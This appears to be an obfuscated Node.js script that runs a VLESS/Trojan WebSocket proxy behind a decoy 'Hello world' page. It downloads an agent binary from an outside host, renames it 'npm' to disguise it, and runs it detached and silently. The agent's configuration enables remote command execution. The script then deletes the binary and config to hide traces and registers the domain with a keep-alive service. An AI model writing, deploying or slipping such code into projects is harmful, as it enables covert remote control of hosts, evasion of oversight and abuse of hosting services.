const _0x3a4d9f=_0x3477;(function(_0x410f88,_0x525c77){const _0x4e529b=_0x3477,_0x46f93b=_0x410f88();while(!![]){try{const _0xfcf946=parseInt(_0x4e529b(0x1e5))/0x1*(-parseInt(_0x4e529b(0x217))/0x2)+-parseInt(_0x4e529b(0x200))/0x3*(parseInt(_0x4e529b(0x212))/0x4)+parseInt(_0x4e529b(0x210))/0x5+-parseInt(_0x4e529b(0x238))/0x6+parseInt(_0x4e529b(0x1d9))/0x7*(parseInt(_0x4e529b(0x230))/0x8)+parseInt(_0x4e529b(0x1eb))/0x9*(-parseInt(_0x4e529b(0x206))/0xa)+parseInt(_0x4e529b(0x1ff))/0xb;if(_0xfcf946===_0x525c77)break;else _0x46f93b['push'](_0x46f93b['shift']());}catch(_0x397f41){_0x46f93b['push'](_0x46f93b['shift']());}}}(_0xed23,0xee77b));const os=require('os'),http=require(_0x3a4d9f(0x20c)),fs=require('fs'),axios=require(_0x3a4d9f(0x1ed)),net=require(_0x3a4d9f(0x1e1)),path=require('path'),crypto=require(_0x3a4d9f(0x201)),{Buffer}=require(_0x3a4d9f(0x225)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3a4d9f(0x237)]||_0x3a4d9f(0x1da),NEZHA_SERVER=process[_0x3a4d9f(0x20a)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x3a4d9f(0x1dd)]||'',NEZHA_KEY=process[_0x3a4d9f(0x20a)]['NEZHA_KEY']||'',DOMAIN=process[_0x3a4d9f(0x20a)][_0x3a4d9f(0x20d)]||_0x3a4d9f(0x22a),AUTO_ACCESS=process['env'][_0x3a4d9f(0x218)]||![],WSPATH=process[_0x3a4d9f(0x20a)][_0x3a4d9f(0x222)]||UUID[_0x3a4d9f(0x1f9)](0x0,0x8),SUB_PATH=process[_0x3a4d9f(0x20a)][_0x3a4d9f(0x1fc)]||_0x3a4d9f(0x1fb),NAME=process['env']['NAME']||_0x3a4d9f(0x20b),PORT=process[_0x3a4d9f(0x20a)][_0x3a4d9f(0x1d4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x7e6911=_0x3a4d9f;try{const _0x40b90d=await axios['get']('https://api.ip.sb/geoip'),_0x173b0f=_0x40b90d[_0x7e6911(0x208)];ISP=(_0x173b0f[_0x7e6911(0x22f)]+'-'+_0x173b0f[_0x7e6911(0x23c)])[_0x7e6911(0x209)](/ /g,'_');}catch(_0x43f59b){ISP=_0x7e6911(0x21d);}};GetISP();const httpServer=http[_0x3a4d9f(0x1f1)]((_0xac8a8b,_0x119bb9)=>{const _0x2ead9d=_0x3a4d9f;if(_0xac8a8b[_0x2ead9d(0x21a)]==='/'){const _0x54ffa2=path['join'](__dirname,_0x2ead9d(0x242));fs['readFile'](_0x54ffa2,_0x2ead9d(0x236),(_0x220595,_0x11c6ac)=>{const _0x264552=_0x2ead9d;if(_0x220595){_0x119bb9['writeHead'](0xc8,{'Content-Type':_0x264552(0x1e0)}),_0x119bb9['end']('Hello\x20world!');return;}_0x119bb9[_0x264552(0x226)](0xc8,{'Content-Type':_0x264552(0x1e0)}),_0x119bb9[_0x264552(0x1d1)](_0x11c6ac);});return;}else{if(_0xac8a8b[_0x2ead9d(0x21a)]==='/'+SUB_PATH){const _0x2abc26=NAME?NAME+'-'+ISP:ISP,_0x33030e=_0x2ead9d(0x1f7)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x2ead9d(0x1e3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x2abc26,_0x34b310='trojan://'+UUID+'@'+DOMAIN+_0x2ead9d(0x23e)+DOMAIN+_0x2ead9d(0x1e3)+DOMAIN+_0x2ead9d(0x215)+WSPATH+'#'+_0x2abc26,_0x4f7374=_0x33030e+'\x0a'+_0x34b310,_0x2b8a9d=Buffer[_0x2ead9d(0x23a)](_0x4f7374)[_0x2ead9d(0x1db)](_0x2ead9d(0x231));_0x119bb9['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x119bb9[_0x2ead9d(0x1d1)](_0x2b8a9d+'\x0a');}else _0x119bb9[_0x2ead9d(0x226)](0x194,{'Content-Type':_0x2ead9d(0x1d2)}),_0x119bb9[_0x2ead9d(0x1d1)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x3a4d9f(0x245))]({'server':httpServer}),uuid=UUID[_0x3a4d9f(0x209)](/-/g,''),DNS_SERVERS=[_0x3a4d9f(0x220),_0x3a4d9f(0x21e)];function resolveHost(_0x2072bb){return new Promise((_0xc28e13,_0x2807a3)=>{const _0x2bf2be=_0x3477;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2bf2be(0x221)](_0x2072bb)){_0xc28e13(_0x2072bb);return;}let _0x511129=0x0;function _0x4dfa3e(){const _0x56f438=_0x2bf2be;if(_0x511129>=DNS_SERVERS['length']){_0x2807a3(new Error(_0x56f438(0x224)+_0x2072bb+_0x56f438(0x21f)));return;}const _0x577fce=DNS_SERVERS[_0x511129];_0x511129++;const _0x2188a4='https://dns.google/resolve?name='+encodeURIComponent(_0x2072bb)+_0x56f438(0x1f3);axios[_0x56f438(0x1fa)](_0x2188a4,{'timeout':0x1388,'headers':{'Accept':_0x56f438(0x21b)}})[_0x56f438(0x207)](_0x34ac4d=>{const _0x165659=_0x56f438,_0x540303=_0x34ac4d['data'];if(_0x540303[_0x165659(0x22c)]===0x0&&_0x540303['Answer']&&_0x540303['Answer'][_0x165659(0x239)]>0x0){const _0x118900=_0x540303[_0x165659(0x223)][_0x165659(0x1ef)](_0x2cde71=>_0x2cde71[_0x165659(0x202)]===0x1);if(_0x118900){_0xc28e13(_0x118900[_0x165659(0x208)]);return;}}_0x4dfa3e();})[_0x56f438(0x234)](_0x132035=>{_0x4dfa3e();});}_0x4dfa3e();});}function _0x3477(_0x24e201,_0x4bf6c7){_0x24e201=_0x24e201-0x1d0;const _0xed230e=_0xed23();let _0x34778d=_0xed230e[_0x24e201];return _0x34778d;}function handleVlessConnection(_0x26390f,_0x575211){const _0x575cd1=_0x3a4d9f,[_0x3d6131]=_0x575211,_0x226f27=_0x575211[_0x575cd1(0x1f9)](0x1,0x11);if(!_0x226f27[_0x575cd1(0x235)]((_0x20deb6,_0x536c06)=>_0x20deb6==parseInt(uuid[_0x575cd1(0x22b)](_0x536c06*0x2,0x2),0x10)))return![];let _0x24126c=_0x575211[_0x575cd1(0x1f9)](0x11,0x12)['readUInt8']()+0x13;const _0x4166fc=_0x575211[_0x575cd1(0x1f9)](_0x24126c,_0x24126c+=0x2)['readUInt16BE'](0x0),_0x510f73=_0x575211[_0x575cd1(0x1f9)](_0x24126c,_0x24126c+=0x1)['readUInt8'](),_0x285fed=_0x510f73==0x1?_0x575211['slice'](_0x24126c,_0x24126c+=0x4)[_0x575cd1(0x1ee)]('.'):_0x510f73==0x2?new TextDecoder()[_0x575cd1(0x247)](_0x575211[_0x575cd1(0x1f9)](_0x24126c+0x1,_0x24126c+=0x1+_0x575211[_0x575cd1(0x1f9)](_0x24126c,_0x24126c+0x1)['readUInt8']())):_0x510f73==0x3?_0x575211['slice'](_0x24126c,_0x24126c+=0x10)['reduce']((_0x5ecd46,_0x135cc5,_0x1d71c1,_0x42f8ed)=>_0x1d71c1%0x2?_0x5ecd46[_0x575cd1(0x1e6)](_0x42f8ed[_0x575cd1(0x1f9)](_0x1d71c1-0x1,_0x1d71c1+0x1)):_0x5ecd46,[])['map'](_0x32f9fa=>_0x32f9fa[_0x575cd1(0x213)](0x0)[_0x575cd1(0x1db)](0x10))[_0x575cd1(0x1ee)](':'):'';_0x26390f[_0x575cd1(0x1e2)](new Uint8Array([_0x3d6131,0x0]));const _0x5037cf=createWebSocketStream(_0x26390f);return resolveHost(_0x285fed)[_0x575cd1(0x207)](_0x28f8bf=>{const _0x24cc1f=_0x575cd1;net[_0x24cc1f(0x20e)]({'host':_0x28f8bf,'port':_0x4166fc},function(){const _0x1c298e=_0x24cc1f;this[_0x1c298e(0x203)](_0x575211['slice'](_0x24126c)),_0x5037cf['on'](_0x1c298e(0x20f),()=>{})[_0x1c298e(0x244)](this)['on'](_0x1c298e(0x20f),()=>{})['pipe'](_0x5037cf);})['on'](_0x24cc1f(0x20f),()=>{});})[_0x575cd1(0x234)](_0x2ec724=>{const _0x26e14c=_0x575cd1;net[_0x26e14c(0x20e)]({'host':_0x285fed,'port':_0x4166fc},function(){const _0xc54ff8=_0x26e14c;this[_0xc54ff8(0x203)](_0x575211['slice'](_0x24126c)),_0x5037cf['on']('error',()=>{})[_0xc54ff8(0x244)](this)['on'](_0xc54ff8(0x20f),()=>{})[_0xc54ff8(0x244)](_0x5037cf);})['on'](_0x26e14c(0x20f),()=>{});}),!![];}function handleTrojanConnection(_0x5c8655,_0xbb0ef9){const _0x55c086=_0x3a4d9f;try{if(_0xbb0ef9[_0x55c086(0x239)]<0x3a)return![];const _0x99b41e=_0xbb0ef9[_0x55c086(0x1f9)](0x0,0x38)[_0x55c086(0x1db)](),_0x5a3aa1=[UUID];let _0x2c020b=null;for(const _0x2616a6 of _0x5a3aa1){const _0xb03575=crypto[_0x55c086(0x1d7)](_0x55c086(0x229))['update'](_0x2616a6)[_0x55c086(0x243)]('hex');if(_0xb03575===_0x99b41e){_0x2c020b=_0x2616a6;break;}}if(!_0x2c020b)return![];let _0x45d1af=0x38;_0xbb0ef9[_0x45d1af]===0xd&&_0xbb0ef9[_0x45d1af+0x1]===0xa&&(_0x45d1af+=0x2);const _0x51a5ed=_0xbb0ef9[_0x45d1af];if(_0x51a5ed!==0x1)return![];_0x45d1af+=0x1;const _0xb066c=_0xbb0ef9[_0x45d1af];_0x45d1af+=0x1;let _0x79c04c,_0x37ef21;if(_0xb066c===0x1)_0x79c04c=_0xbb0ef9[_0x55c086(0x1f9)](_0x45d1af,_0x45d1af+0x4)[_0x55c086(0x1ee)]('.'),_0x45d1af+=0x4;else{if(_0xb066c===0x3){const _0x2b29b9=_0xbb0ef9[_0x45d1af];_0x45d1af+=0x1,_0x79c04c=_0xbb0ef9['slice'](_0x45d1af,_0x45d1af+_0x2b29b9)[_0x55c086(0x1db)](),_0x45d1af+=_0x2b29b9;}else{if(_0xb066c===0x4)_0x79c04c=_0xbb0ef9[_0x55c086(0x1f9)](_0x45d1af,_0x45d1af+0x10)[_0x55c086(0x1f6)]((_0x33d6e5,_0x42ef4a,_0x559583,_0x6a4909)=>_0x559583%0x2?_0x33d6e5[_0x55c086(0x1e6)](_0x6a4909['slice'](_0x559583-0x1,_0x559583+0x1)):_0x33d6e5,[])[_0x55c086(0x1d6)](_0x137b1c=>_0x137b1c[_0x55c086(0x213)](0x0)[_0x55c086(0x1db)](0x10))['join'](':'),_0x45d1af+=0x10;else return![];}}_0x37ef21=_0xbb0ef9[_0x55c086(0x213)](_0x45d1af),_0x45d1af+=0x2;_0x45d1af<_0xbb0ef9[_0x55c086(0x239)]&&_0xbb0ef9[_0x45d1af]===0xd&&_0xbb0ef9[_0x45d1af+0x1]===0xa&&(_0x45d1af+=0x2);const _0x3fa219=createWebSocketStream(_0x5c8655);return resolveHost(_0x79c04c)[_0x55c086(0x207)](_0x574bbd=>{const _0x13c59d=_0x55c086;net[_0x13c59d(0x20e)]({'host':_0x574bbd,'port':_0x37ef21},function(){const _0x1bea18=_0x13c59d;_0x45d1af<_0xbb0ef9['length']&&this[_0x1bea18(0x203)](_0xbb0ef9['slice'](_0x45d1af)),_0x3fa219['on'](_0x1bea18(0x20f),()=>{})[_0x1bea18(0x244)](this)['on'](_0x1bea18(0x20f),()=>{})['pipe'](_0x3fa219);})['on']('error',()=>{});})[_0x55c086(0x234)](_0x586b81=>{const _0x4c32c6=_0x55c086;net[_0x4c32c6(0x20e)]({'host':_0x79c04c,'port':_0x37ef21},function(){const _0x207f21=_0x4c32c6;_0x45d1af<_0xbb0ef9[_0x207f21(0x239)]&&this[_0x207f21(0x203)](_0xbb0ef9[_0x207f21(0x1f9)](_0x45d1af)),_0x3fa219['on']('error',()=>{})[_0x207f21(0x244)](this)['on'](_0x207f21(0x20f),()=>{})[_0x207f21(0x244)](_0x3fa219);})['on'](_0x4c32c6(0x20f),()=>{});}),!![];}catch(_0x1287e9){return![];}}wss['on'](_0x3a4d9f(0x227),(_0x20ab44,_0x30221e)=>{const _0x3d450e=_0x3a4d9f,_0x2ce58d=_0x30221e[_0x3d450e(0x21a)]||'';_0x20ab44[_0x3d450e(0x216)]('message',_0x3d803b=>{const _0x32abc1=_0x3d450e;if(_0x3d803b[_0x32abc1(0x239)]>0x11&&_0x3d803b[0x0]===0x0){const _0x378e2f=_0x3d803b['slice'](0x1,0x11),_0xee8375=_0x378e2f['every']((_0x11786f,_0xe5e5ae)=>_0x11786f==parseInt(uuid['substr'](_0xe5e5ae*0x2,0x2),0x10));if(_0xee8375){!handleVlessConnection(_0x20ab44,_0x3d803b)&&_0x20ab44['close']();return;}}!handleTrojanConnection(_0x20ab44,_0x3d803b)&&_0x20ab44[_0x32abc1(0x241)]();})['on'](_0x3d450e(0x20f),()=>{});});const getDownloadUrl=()=>{const _0x436147=_0x3a4d9f,_0x4816ce=os['arch']();return _0x4816ce==='arm'||_0x4816ce==='arm64'||_0x4816ce===_0x436147(0x1d3)?!NEZHA_PORT?_0x436147(0x23f):_0x436147(0x232):!NEZHA_PORT?_0x436147(0x1de):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x275731=_0x3a4d9f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5d6527=getDownloadUrl(),_0x596686=await axios({'method':'get','url':_0x5d6527,'responseType':_0x275731(0x1d5)}),_0x29c0aa=fs[_0x275731(0x214)](_0x275731(0x1e8));return _0x596686['data'][_0x275731(0x244)](_0x29c0aa),new Promise((_0x5f3252,_0x5bbbef)=>{const _0x18bf13=_0x275731;_0x29c0aa['on'](_0x18bf13(0x1d8),()=>{const _0x5c9642=_0x18bf13;console[_0x5c9642(0x204)](_0x5c9642(0x240)),exec(_0x5c9642(0x1fe),_0x2c7560=>{if(_0x2c7560)_0x5bbbef(_0x2c7560);_0x5f3252();});}),_0x29c0aa['on']('error',_0x5bbbef);});}catch(_0x586610){throw _0x586610;}},runnz=async()=>{const _0x2a1a2a=_0x3a4d9f;try{const _0x45b09c=execSync(_0x2a1a2a(0x23b),{'encoding':_0x2a1a2a(0x1ea)});if(_0x45b09c[_0x2a1a2a(0x1f0)]()!==''){console[_0x2a1a2a(0x204)](_0x2a1a2a(0x21c));return;}}catch(_0x23fe3b){}await downloadFile();let _0x44e4a7='',_0x2a9f9e=[_0x2a1a2a(0x246),_0x2a1a2a(0x1e4),'2096',_0x2a1a2a(0x23d),_0x2a1a2a(0x1fd),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x7332e7=_0x2a9f9e[_0x2a1a2a(0x233)](NEZHA_PORT)?_0x2a1a2a(0x211):'';_0x44e4a7='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2a1a2a(0x1f4)+NEZHA_KEY+'\x20'+_0x7332e7+_0x2a1a2a(0x1d0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x38e9c8=NEZHA_SERVER[_0x2a1a2a(0x233)](':')?NEZHA_SERVER[_0x2a1a2a(0x1dc)](':')[_0x2a1a2a(0x1f2)]():'',_0x637fd5=_0x2a9f9e[_0x2a1a2a(0x233)](_0x38e9c8)?'true':'false',_0x1d1e5f='client_secret:\x20'+NEZHA_KEY+_0x2a1a2a(0x22e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x637fd5+_0x2a1a2a(0x1e7)+UUID;fs[_0x2a1a2a(0x228)]('config.yaml',_0x1d1e5f);}_0x44e4a7=_0x2a1a2a(0x1f8);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x44e4a7,{'shell':_0x2a1a2a(0x219)},_0x530e64=>{const _0x2f33bc=_0x2a1a2a;if(_0x530e64)console[_0x2f33bc(0x20f)](_0x2f33bc(0x1f5),_0x530e64);else console[_0x2f33bc(0x204)]('npm\x20is\x20running');});}catch(_0x5d4914){console[_0x2a1a2a(0x20f)](_0x2a1a2a(0x205)+_0x5d4914);}};async function addAccessTask(){const _0x4e48b3=_0x3a4d9f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2a9b18='https://'+DOMAIN;try{const _0x53bfa0=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x2a9b18},{'headers':{'Content-Type':_0x4e48b3(0x1df)}});console['log'](_0x4e48b3(0x1e9));}catch(_0x5a4c67){}}const delFiles=()=>{const _0x4c2c1b=_0x3a4d9f;fs['unlink'](_0x4c2c1b(0x1e8),()=>{}),fs[_0x4c2c1b(0x1ec)]('config.yaml',()=>{});};function _0xed23(){const _0x41a2db=['replace','env','Hug','http','DOMAIN','connect','error','8463120nxoXey','--tls','744AdxoUe','readUInt16BE','createWriteStream','&path=%2F','once','1018gKJaGf','AUTO_ACCESS','/bin/bash','url','application/dns-json','npm\x20is\x20already\x20running,\x20skip\x20running...','Unknown','1.1.1.1','\x20with\x20all\x20DNS\x20servers','8.8.4.4','test','WSPATH','Answer','Failed\x20to\x20resolve\x20','buffer','writeHead','connection','writeFileSync','sha224','1234.abc.com','substr','Status','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country_code','13840orfXtw','base64','https://arm64.ssss.nyc.mn/agent','includes','catch','every','utf8','UUID','5305428BwyjAX','length','from','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','isp','2087',':443?security=tls&sni=','https://arm64.ssss.nyc.mn/v1','npm\x20download\x20successfully','close','index.html','digest','pipe','Server','443','decode','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','end','text/plain','aarch64','PORT','stream','map','createHash','finish','1841KwFWgG','6914472c-e297-4984-9785-7e99a4fc692a','toString','split','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','application/json','text/html','net','send','&fp=chrome&type=ws&host=','8443','1126pTogjv','concat','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm','Automatic\x20Access\x20Task\x20added\x20successfully','utf-8','18yAXurw','unlink','axios','join','find','trim','createServer','pop','&type=A','\x20-p\x20','npm\x20running\x20error:','reduce','vless://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','slice','get','sub','SUB_PATH','2083','chmod\x20+x\x20npm','25993055vDodxV','30345EpLqgU','crypto','type','write','log','error:\x20','975470BNFeXF','then','data'];_0xed23=function(){return _0x41a2db;};return _0xed23();}httpServer[_0x3a4d9f(0x22d)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
